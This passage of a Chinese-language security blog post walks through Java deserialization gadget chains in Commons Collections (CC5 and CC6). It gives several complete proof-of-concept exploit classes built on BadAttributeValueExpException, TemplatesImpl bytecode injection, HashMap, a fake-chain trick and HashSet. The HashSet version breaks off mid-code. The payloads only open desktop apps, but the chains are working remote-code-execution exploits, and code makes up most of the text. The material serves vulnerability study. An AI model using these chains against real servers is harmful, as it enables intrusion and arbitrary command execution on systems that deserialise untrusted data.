<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BadAttributeValueExpException_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>,<span class="string">"abcd"</span>);</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="number">123</span>);</span><br><span class="line">        BadAttributeValueExpException payload = <span class="keyword">new</span> BadAttributeValueExpException(<span class="number">1</span>);</span><br><span class="line">        Field val = BadAttributeValueExpException.class.getDeclaredField("val");</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(payload,tmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_BadAttributeValueExpException.ser"</span>)));</span><br><span class="line">        fout.writeObject(payload);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_BadAttributeValueExpException.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>慢点，这里既然提到了chain，我们可以模仿cc3来用InstantiateTransformer参与chain的构造，还有TrAXFilter：</p>
<p><strong>ver2</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InstantiateTransformer_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.构造chain，封装进LazyMap</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">                <span class="title">new</span> <span class="title">InstantiateTransformer</span>(</span></span><br><span class="line">                        new Class[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;tmpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap lazymap = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> TiedMapEntry(lazymap, <span class="number">123</span>);</span><br><span class="line">        BadAttributeValueExpException payload = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field val = BadAttributeValueExpException.class.getDeclaredField("val");</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(payload,tmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_InstantiateTransformer.ser"</span>)));</span><br><span class="line">        fout.writeObject(payload);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_InstantiateTransformer.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>等一下，既然可以用TemplatesImpl，那么我们在cc2的TemplatesImpl版本中发现，TemplatesImpl的newTransformer会将自身的_bytecodes直接数组生成类对象，执行对象构造函数。</p>
<p>我们发现在TiedMapEntry的getValue中会将key参数传入，之后transform也会将key传递，所以这里我们还可以将tmpl传入TiedMapEntry的key属性，在最后也会被执行到。</p>
<p><strong>ver3</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatesImpl_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception</span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.构造InvokerTransformer</span></span><br><span class="line">        InvokerTransformer iInvokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"newTransformer"</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        <span class="comment">//InvokerTransformer iInvokerTransformer = new InvokerTransformer("getOutputProperties",new Class[]&#123;&#125;,new Object[]&#123;&#125;);也可以</span></span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap lazymap = (LazyMap)LazyMap.decorate(innermap,iInvokerTransformer);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> TiedMapEntry(lazymap, tmpl);<span class="comment">//注意这里</span></span><br><span class="line">        BadAttributeValueExpException payload = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field val = BadAttributeValueExpException.class.getDeclaredField("val");</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(payload,tmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_TemplatesImpl.ser"</span>)));</span><br><span class="line">        fout.writeObject(payload);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_TemplatesImpl.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="cc6"><a href="#cc6" class="headerlink" title="cc6"></a>cc6</h2><p>条件：</p>
<ul>
<li><p><strong>commons-collections:3.1-3.2.1</strong></p>
</li>
<li><p><strong>jdk1.7&amp;1.8</strong></p>
</li>
</ul>
<h3 id="利用链寻找-5"><a href="#利用链寻找-5" class="headerlink" title="利用链寻找"></a>利用链寻找</h3><p>CC5 用了 BadAttributeValueExpException 反序列化去触发 LazyMap.get()，除了 BadAttributeValueExpException 、AnnotationInvocationHandler 还有其他方法吗？ ysoserial告诉我们HashMap也可以！</p>
<p>我们再看看TiedMapEntry的内部方法hashCode：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516212156876.png" alt="image-20210516212156876"></p>
<p>这里也调用了getValue！</p>
<p>如何反序列化时触发 TiedMapEntry.hashCode() ? </p>
<p>ysoserial发现了HashMap的readObject方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516213000509.png" alt="image-20210516213000509"></p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516213024813.png" alt="image-20210516213024813"></p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516213038915.png" alt="image-20210516213038915"></p>
<p>调用了k.hashCode。</p>
<p>所以很容易想当然地构造出来一版PoC：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516221018615.png" alt="image-20210516221018615"></p>
<p>但是你会发现，<strong>在put操作处就会触发payload了，根本不是在readObject里面</strong>。</p>
<p>跟进去看看，这里面直接就触发了利用链，所以我们希望利用链触发在readObejct的位置。</p>
<p>如果想在readObject位置触发，跟几步发现，需要在LazyMap的get方法中让下面这个判断成立，才能进入transform：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516221822432.png" alt="image-20210516221822432"></p>
<p>这里面的map就是LazyMap，key就是123</p>
<p>我们当然希望返回值是false</p>
<p>继续跟进LazyMap的containsKey：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516222703891.png" alt="image-20210516222703891"></p>
<p>希望getEntry(key)==null</p>
<p>继续跟进getEntry，这里面的key是123：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516222727559.png" alt="image-20210516222727559"></p>
<p>这里可以看到，先有一个key是否为null的判断，<strong>123不为null所以执行了hash(key)</strong></p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517095158842.png" alt="image-20210517095158842"></p>
<p>table是什么呢？</p>
<p>当我们第一次：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">hashMap.put(tmap, <span class="string">"test"</span>);</span><br></pre></td></tr></table></figure>

<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517100233906.png" alt="image-20210517100233906"></p>
<p>虽然我们调用的是无参构造方法，但是这里会给我们安排到有参构造方法。</p>
<p><code>DEFAULT_INITIAL_CAPACITY = 16</code>进入有参构造方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517103659313.png" alt="image-20210517103659313"></p>
<p>这个table属于最外面的hashMap，他的长度为16</p>
<p>继续跟进到TiedMapEntry的get方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517102800741.png" alt="image-20210517102800741"></p>
<p>这里面的map是LazyMap类的对象，也就是我们传进去的lazyMap</p>
<p>继续跟，来到LazyMap的get方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517103044779.png" alt="image-20210517103044779"></p>
<p>这里面的map是我们传进去的innermap，也就是hashmap类型</p>
<p>跟进去看，</p>
<p>这里可以看到，先有一个key是否为null的判断，<strong>123不为null所以执行了hash(key)</strong></p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517104830975.png" alt="image-20210517104830975"></p>
<p>所以这里e为null，返回null。成功会在put触发。</p>
<p>但是不要忘了put之后的状态：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517110138797.png" alt="image-20210517110138797"></p>
<p>lazymap.map就被放入了一个key，key的entry。</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517110237951.png" alt="image-20210517110237951"></p>
<p>假如说这时候我们再通过HashMap的readObject方法来到LazyMap的get方法这里，当再次经过这次判断的时候，因为map里已经存放了entry&lt;“123”，“123”&gt;，那么就不再会是false，导致无法进入transform方法，利用链断掉。</p>
<p>所以我们需要把map的内容改掉：</p>
<p>两种方法都行：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyMap.remove(<span class="number">123</span>);</span><br><span class="line">lazyMap.clear(</span><br></pre></td></tr></table></figure>

<p>我们可以改写一下，将lazyMap中hashmap的put之后的key去掉，这样就可以先执行，然后在反序列化时候再执行一遍：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516222948500.png" alt="image-20210516222948500"></p>
<h3 id="HashMap版PoC"><a href="#HashMap版PoC" class="headerlink" title="HashMap版PoC"></a>HashMap版PoC</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class HashMap_Exploit &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Transformer[] transformers_exec = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;open /Applications/Calculator.app&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = new ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = new HashMap();</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        TiedMapEntry tmap = new TiedMapEntry(lazyMap, 123);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(tmap, &quot;test&quot;);</span><br><span class="line">        lazyMap.remove(&quot;123&quot;);</span><br><span class="line"></span><br><span class="line">        //payload序列化写入文件，模拟网络传输</span><br><span class="line">        ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty(&quot;user.dir&quot;)+&quot;/src/main/resources/Payload_cc6_HashMap.ser&quot;)));</span><br><span class="line">        fout.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        //服务端读取文件，反序列化，模拟网络传输</span><br><span class="line">        ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty(&quot;user.dir&quot;)+&quot;/src/main/resources/Payload_cc6_HashMap.ser&quot;)));</span><br><span class="line">        //服务端反序列化，触发漏洞</span><br><span class="line">        fin.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="fake-chain版PoC"><a href="#fake-chain版PoC" class="headerlink" title="fake chain版PoC"></a>fake chain版PoC</h3><p>既然现在来到了如何绕过put方法的提前执行，可以在构造LazyMap方法的时候穿进去一个空的chain，之后再利用反射将lazymap内部的<code>_itransformer</code>属性改回到真正的chain，这样就可以只最终的反序列化触发点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fackchain_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /Applications/IINA.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> Transformer[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//fake chain</span></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(fakeTransformer);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//先构造假的chain</span></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashMap.put(tmap, <span class="string">"test"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用反射再改回真的chain</span></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(chain, transformers_exec);</span><br><span class="line">        <span class="comment">//清空由于 hashMap.put 对 LazyMap 造成的影响</span></span><br><span class="line">        lazyMap.clear();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_fakechain.ser"</span>)));</span><br><span class="line">        fout.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_fakechain.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="HashSet版PoC"><a href="#HashSet版PoC" class="headerlink" title="HashSet版PoC"></a>HashSet版PoC</h3><p>在HashMap的hash中，k目前还是不可控的，所以还需要找哪些函数调用了hash函数，发现HashMap自己的put方法调用了：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516215129678.png" alt="image-20210516215129678"></p>
<p>然而这里的key还是不可控的，所以我们要找哪里调用了put方法，发现HashSet的readObject很合适：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516215400317.png" alt="image-20210516215400317"></p>
<p>HashSet的底层其实还是HashMap类，我们需要让HashSet的map属性为HashMap，显然可控。</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517111854587.png" alt="image-20210517111854587"></p>
<h3 id="最终版本PoC-7"><a href="#最终版本PoC-7" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashSet_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /Applications/IINA.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        HashSet hashset = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="string">"0range"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将map属性设置为我们的tmap</span></span><br><span class="line">        <span class="comment">//1.先拿到handle</span></span><br><span class="line">        Field map = Class.forName(<span class="string">"java.util.HashSet"</span>).getDeclaredField(<span class="string">"map"</span>);</span><br><span class="line">        map.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap hashset_map = (HashMap) map.get(hashset);</span><br><span class="line">        <span class="comment">//2.拿到map的table属性，里面应该存放entry</span></span><br><span class="line">        Field table = Class.forName(<span class="string">"java.util.HashMap"</span>).getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">        table.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = 